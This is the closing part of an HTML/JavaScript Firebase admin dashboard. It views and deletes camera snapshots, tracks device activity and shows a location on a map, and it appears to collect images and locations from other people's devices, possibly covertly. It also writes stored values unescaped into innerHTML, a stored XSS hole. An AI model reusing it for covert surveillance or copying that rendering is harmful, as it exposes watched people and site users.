                const snapshotData = (await snapshotRef.once('value')).val();

                if (snapshotData && snapshotData.photo) {
                    const photoURL = snapshotData.photo;
                    // Extract storage path from download URL
                    // This assumes the photoURL is a standard Firebase Storage download URL
                    const baseUrl = `https://firebasestorage.googleapis.com/v0/b/${firebaseConfig.storageBucket}/o/`;
                    if (photoURL.startsWith(baseUrl)) {
                        let storagePath = photoURL.substring(baseUrl.length);
                        const queryIndex = storagePath.indexOf('?');
                        if (queryIndex > -1) {
                            storagePath = storagePath.substring(0, queryIndex);
                        }
                        storagePath = decodeURIComponent(storagePath); // Decode URL-encoded characters

                        const storageRef = storage.ref(storagePath);
                        await storageRef.delete();
                        console.log('Image deleted from storage:', storagePath);
                    } else {
                        console.warn('Photo URL does not match expected Firebase Storage format, skipping storage deletion:', photoURL);
                    }
                }

                await snapshotRef.remove();
                alert('Snapshot deleted successfully!');
                loadSnapshots(); // Refresh the snapshots list
                loadDashboardData(); // Update dashboard stats
            } catch (error) {
                console.error('Error deleting snapshot:', error);
                alert('Failed to delete snapshot: ' + error.message);
            }
        }

        // Function to delete all snapshots
        async function deleteAllSnapshots() {
            if (!confirm('Are you absolutely sure you want to delete ALL snapshots? This action cannot be undone.')) return;

            try {
                const snapshotsRef = database.ref('botSnapshots');
                const allSnapshots = (await snapshotsRef.once('value')).val();

                if (allSnapshots) {
                    const deletePromises = [];
                    for (const key in allSnapshots) {
                        const snapshotData = allSnapshots[key];
                        if (snapshotData.photo) {
                            const photoURL = snapshotData.photo;
                            const baseUrl = `https://firebasestorage.googleapis.com/v0/b/${firebaseConfig.storageBucket}/o/`;
                            if (photoURL.startsWith(baseUrl)) {
                                let storagePath = photoURL.substring(baseUrl.length);
                                const queryIndex = storagePath.indexOf('?');
                                if (queryIndex > -1) {
                                    storagePath = storagePath.substring(0, queryIndex);
                                }
                                storagePath = decodeURIComponent(storagePath);
                                deletePromises.push(storage.ref(storagePath).delete().catch(e => console.warn('Failed to delete storage item:', storagePath, e.message)));
                            } else {
                                console.warn('Photo URL does not match expected Firebase Storage format for key:', key);
                            }
                        }
                        deletePromises.push(snapshotsRef.child(key).remove().catch(e => console.warn('Failed to delete RTDB item:', key, e.message)));
                    }
                    await Promise.allSettled(deletePromises); // Use allSettled to ensure all promises resolve/reject
                }

                alert('All snapshots deleted successfully!');
                loadSnapshots(); // Refresh the snapshots list
                loadDashboardData(); // Update dashboard stats
            } catch (error) {
                console.error('Error deleting all snapshots:', error);
                alert('Failed to delete all snapshots: ' + error.message);
            }
        }


        // Load snapshots
        async function loadSnapshots() {
            const tbody = document.getElementById('snapshotsList');
            tbody.innerHTML = '<tr><td colspan="5">Loading...</td></tr>';
            
            try {
                const snapshot = await database.ref('botSnapshots').once('value');
                const data = snapshot.val();
                tbody.innerHTML = '';
                
                if (!data) {
                    tbody.innerHTML = '<tr><td colspan="5">No snapshots available</td></tr>';
                    return;
                }
                
                // Sort by timestamp (newest first)
                const sortedData = Object.entries(data).sort((a, b) => b[1].timestamp - a[1].timestamp);
                
                sortedData.forEach(([key, snapshot]) => {
                    const row = document.createElement('tr');
                    const date = new Date(snapshot.timestamp);
                    
                    row.innerHTML = `
                        <td>
                            <img src="${snapshot.photo}" alt="Snapshot" class="image-preview" 
                                 onclick="viewSnapshot('${key}')">
                        </td>
                        <td>${date.toLocaleString()}</td>
                        <td>${snapshot.deviceInfo ? snapshot.deviceInfo.substring(0, Math.min(snapshot.deviceInfo.length, 30)) + (snapshot.deviceInfo.length > 30 ? '...' : '') : 'Unknown'}</td>
                        <td>${snapshot.resolution || 'N/A'}</td>
                        <td>
                            <button class="btn btn-primary" onclick="viewSnapshot('${key}')">
                                <i class="fas fa-eye"></i> View
                            </button>
                            <button class="btn btn-danger" onclick="deleteSnapshot('${key}')">
                                <i class="fas fa-trash"></i> Delete
                            </button>
                        </td>
                    `;
                    tbody.appendChild(row);
                });
            } catch (error) {
                console.error('Error loading snapshots:', error);
                tbody.innerHTML = `<tr><td colspan="5">Error loading snapshots: ${error.message}</td></tr>`;
            }
        }

        // Load locations
        async function loadLocations() {
            const tbody = document.getElementById('locationsList');
            tbody.innerHTML = '<tr><td colspan="4">Loading...</td></tr>';
            
            try {
                const snapshot = await database.ref('userData/location').once('value');
                const data = snapshot.val();
                tbody.innerHTML = '';
                
                if (!data) {
                    tbody.innerHTML = '<tr><td colspan="4">No locations available</td></tr>';
                    // Clear existing markers if no data
                    markers.forEach(marker => map.removeLayer(marker));
                    markers = [];
                    return;
                }
                
                const date = new Date(data.timestamp);
                
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${date.toLocaleString()}</td>
                    <td>${data.latitude}, ${data.longitude}</td>
                    <td><a href="${data.mapLink}" target="_blank">View on Google Maps</a></td>
                    <td>
                        <button class="btn btn-primary" onclick="viewLocationOnMap(${data.latitude}, ${data.longitude})">
                            <i class="fas fa-map-marked-alt"></i> View Map
                        </button>
                    </td>
                `;
                tbody.appendChild(row);
                
                // Update map with marker
                if (map) {
                    // Clear existing markers
                    markers.forEach(marker => map.removeLayer(marker));
                    markers = [];
                    
                    // Add new marker
                    const marker = L.marker([data.latitude, data.longitude]).addTo(map)
                        .bindPopup(`<b>User Location</b><br>Lat: ${data.latitude}<br>Lng: ${data.longitude}`);
                    markers.push(marker);
                    
                    // Fit map to marker
                    map.fitBounds([marker.getLatLng()]);
                }
            } catch (error) {
                console.error('Error loading locations:', error);
                tbody.innerHTML = `<tr><td colspan="4">Error loading locations: ${error.message}</td></tr>`;
            }
        }

        // Load devices
        async function loadDevices() {
            const tbody = document.getElementById('devicesList');
            tbody.innerHTML = '<tr><td colspan="5">Loading...</td></tr>';
            
            try {
                const snapshot = await database.ref('botSnapshots').once('value');
                const data = snapshot.val();
                tbody.innerHTML = '';
                
                if (!data) {
                    tbody.innerHTML = '<tr><td colspan="5">No device data available</td></tr>';
                    return;
                }
                
                // Group by device (simplified)
                const devices = {};
                Object.values(data).forEach(snapshot => {
                    const deviceId = snapshot.deviceInfo || 'Unknown';
                    if (!devices[deviceId]) {
                        devices[deviceId] = {
                            firstSeen: snapshot.timestamp,
                            lastActive: snapshot.timestamp,
                            count: 1
                        };
                    } else {
                        devices[deviceId].count++;
                        if (snapshot.timestamp < devices[deviceId].firstSeen) {
                            devices[deviceId].firstSeen = snapshot.timestamp;
                        }
                        if (snapshot.timestamp > devices[deviceId].lastActive) {
                            devices[deviceId].lastActive = snapshot.timestamp;
                        }
                    }
                });
                
                // Create rows
                Object.entries(devices).forEach(([deviceId, deviceData]) => {
                    const row = document.createElement('tr');
                    const firstSeen = new Date(deviceData.firstSeen);
                    const lastActive = new Date(deviceData.lastActive);
                    // Consider a device active if its last snapshot was within the last 24 hours
                    const isActive = (Date.now() - lastActive.getTime()) < (24 * 60 * 60 * 1000); 
                    
                    row.innerHTML = `
                        <td>${deviceId.substring(0, Math.min(deviceId.length, 20))}...</td>
                        <td title="${deviceId}">${deviceId.substring(0, Math.min(deviceId.length, 30))}...</td>
                        <td>${firstSeen.toLocaleString()}</td>
                        <td>${lastActive.toLocaleString()}</td>
                        <td><span class="status ${isActive ? 'active' : 'inactive'}">${isActive ? 'Active' : 'Inactive'}</span></td>
                    `;
                    tbody.appendChild(row);
                });
            } catch (error) {
                console.error('Error loading devices:', error);
                tbody.innerHTML = `<tr><td colspan="5">Error loading device data: ${error.message}</td></tr>`;
            }
        }

        // Load settings
        function loadSettings() {
            database.ref('settings').once('value').then(snapshot => {
                const data = snapshot.val();
                if (data) {
                    document.getElementById('snapshotInterval').value = data.snapshotInterval || 5;
                    document.getElementById('dataRetention').value = data.dataRetention || 30;
                } else {
                    // Set default values if no settings found
                    document.getElementById('snapshotInterval').value = 5;
                    document.getElementById('dataRetention').value = 30;
                }
            }).catch(error => {
                console.error('Error loading settings:', error);
                alert('Failed to load settings: ' + error.message);
                // Fallback to default values on error
                document.getElementById('snapshotInterval').value = 5;
                document.getElementById('dataRetention').value = 30;
            });
        }

        // Save settings
        async function saveSettings() {
            const snapshotInterval = document.getElementById('snapshotInterval').value;
            const dataRetention = document.getElementById('dataRetention').value;

            if (snapshotInterval < 1 || snapshotInterval > 60) {
                alert('Snapshot Interval must be between 1 and 60 seconds.');
                return;
            }
            if (dataRetention < 1 || dataRetention > 365) {
                alert('Data Retention must be between 1 and 365 days.');
                return;
            }

            try {
                await database.ref('settings').set({
                    snapshotInterval: parseInt(snapshotInterval),
                    dataRetention: parseInt(dataRetention),
                    lastUpdated: firebase.database.ServerValue.TIMESTAMP
                });
                alert('Settings saved successfully!');
            } catch (error) {
                console.error('Error saving settings:', error);
                alert('Failed to save settings: ' + error.message);
            }
        }

        // --- Live Camera Feed Functions ---

        // Start live camera feed
        async function startLiveCameraFeed() {
            if (liveStream) {
                alert('Live feed is already running.');
                return;
            }

            try {
                // Request camera access
                liveVideoElement.style.display = 'block'; // Show video element placeholder
                liveStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                liveVideoElement.srcObject = liveStream;
                await liveVideoElement.play(); // Start playing the video stream

                // Start capturing frames every 5 seconds
                liveInterval = setInterval(captureAndUploadLiveFrame, 5000); 

                startLiveFeedBtn.disabled = true;
                stopLiveFeedBtn.disabled = false;
                console.log('Live camera feed started.');
            } catch (error) {
                console.error('Error accessing camera:', error);
                alert('Failed to start live camera feed. Please ensure camera is available and permission is granted. Error: ' + error.message);
                stopLiveCameraFeed(); // Ensure clean up
            }
        }

        // Stop live camera feed
        function stopLiveCameraFeed() {
            if (liveInterval) {
                clearInterval(liveInterval);
                liveInterval = null;
            }
            if (liveStream) {
                liveStream.getTracks().forEach(track => track.stop()); // Stop all tracks (video, audio)
                liveStream = null;
                liveVideoElement.srcObject = null;
                liveVideoElement.style.display = 'none'; // Hide video element
            }
            startLiveFeedBtn.disabled = false;
            stopLiveFeedBtn.disabled = true;
            console.log('Live camera feed stopped.');
        }

        // Capture a frame from video and upload
        async function captureAndUploadLiveFrame() {
            if (!liveVideoElement || !liveStream || liveVideoElement.videoWidth === 0) {
                console.warn('Live video not ready for capture.');
                return;
            }

            try {
                // Set canvas dimensions to match video
                liveCanvasElement.width = liveVideoElement.videoWidth;
                liveCanvasElement.height = liveVideoElement.videoHeight;
                const context = liveCanvasElement.getContext('2d');
                context.drawImage(liveVideoElement, 0, 0, liveCanvasElement.width, liveCanvasElement.height);

                // Convert canvas content to a Blob (JPEG format)
                liveCanvasElement.toBlob(async (blob) => {
                    if (!blob) {
                        console.error('Failed to create image blob from canvas.');
                        return;
                    }

                    const timestamp = Date.now();
                    const deviceId = `AdminPanelLiveFeed_${Date.now()}`; // Unique ID for each admin's device
                    const filename = `live_snapshots/${deviceId}_${timestamp}.jpg`;
                    const storageRef = storage.ref(filename);

                    // Upload to Firebase Storage
                    const uploadTask = storageRef.put(blob);
                    uploadTask.on('state_changed', 
                        (snapshot) => {
                            // Optional: track progress
                            // const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
                            // console.log('Upload is ' + progress + '% done');
                        }, 
                        (error) => {
                            console.error('Upload failed:', error);
                        }, 
                        async () => {
                            // Upload successful, get download URL
                            const downloadURL = await storageRef.getDownloadURL();
                            console.log('Image uploaded:', downloadURL);

                            // Save snapshot metadata to Realtime Database
                            const newSnapshotRef = database.ref('botSnapshots').push();
                            await newSnapshotRef.set({
                                timestamp: timestamp,
                                photo: downloadURL,
                                deviceInfo: `Live Feed from Admin Panel (${navigator.userAgent})`,
                                resolution: `${liveVideoElement.videoWidth}x${liveVideoElement.videoHeight}`,
                                fileSize: blob.size,
                                type: 'live' // Add a type to distinguish
                            });

                            // Update latest live image display in the UI
                            latestLiveImage.src = downloadURL;
                            latestLiveImageTimestamp.textContent = `Last updated: ${new Date(timestamp).toLocaleString()}`;
                            console.log('Live snapshot saved to DB.');
                        }
                    );
                }, 'image/jpeg', 0.9); // Quality 0.9
            } catch (error) {
                console.error('Error capturing or uploading live frame:', error);
            }
        }

        // Load the latest live image (when entering the section or on refresh)
        function loadLiveFeedData() {
            // This listens for *any* new snapshot, then filters for the latest 'live' type.
            // For a dedicated live feed, you might want a separate RTDB node for just live_feed_latest_snapshot.
            database.ref('botSnapshots').orderByChild('timestamp').limitToLast(1).once('value').then(snapshot => {
                let latestLive = null;
                snapshot.forEach(childSnapshot => {
                    // Check if the latest snapshot is of type 'live'
                    if (childSnapshot.val().type === 'live') {
                        latestLive = childSnapshot.val();
                    }
                });

                if (latestLive) {
                    latestLiveImage.src = latestLive.photo;
                    latestLiveImageTimestamp.textContent = `Last updated: ${new Date(latestLive.timestamp).toLocaleString()}`;
                } else {
                    latestLiveImage.src = "https://via.placeholder.com/400x300?text=No+Live+Image";
                    latestLiveImageTimestamp.textContent = "No live image captured yet.";
                }
            }).catch(error => {
                console.error('Error loading latest live image:', error);
                latestLiveImage.src = "https://via.placeholder.com/400x300?text=Error+Loading+Image";
                latestLiveImageTimestamp.textContent = `Error: ${error.message}`;
            });
        }


        // Event Listeners for Refresh and Settings
        document.getElementById('refreshRecent').addEventListener('click', loadDashboardData);
        document.getElementById('refreshSnapshots').addEventListener('click', loadSnapshots);
        document.getElementById('refreshLocations').addEventListener('click', loadLocations);
        document.getElementById('refreshDevices').addEventListener('click', loadDevices);
        document.getElementById('saveSettings').addEventListener('click', saveSettings);
        document.getElementById('deleteAllSnapshots').addEventListener('click', deleteAllSnapshots);

        // Event Listeners for Live Camera Feed
        startLiveFeedBtn.addEventListener('click', startLiveCameraFeed);
        stopLiveFeedBtn.addEventListener('click', stopLiveCameraFeed);


        // Initial load of dashboard data when the page loads
        document.addEventListener('DOMContentLoaded', () => {
            loadSectionData('dashboard');
        });
    </script>
</body>
</html>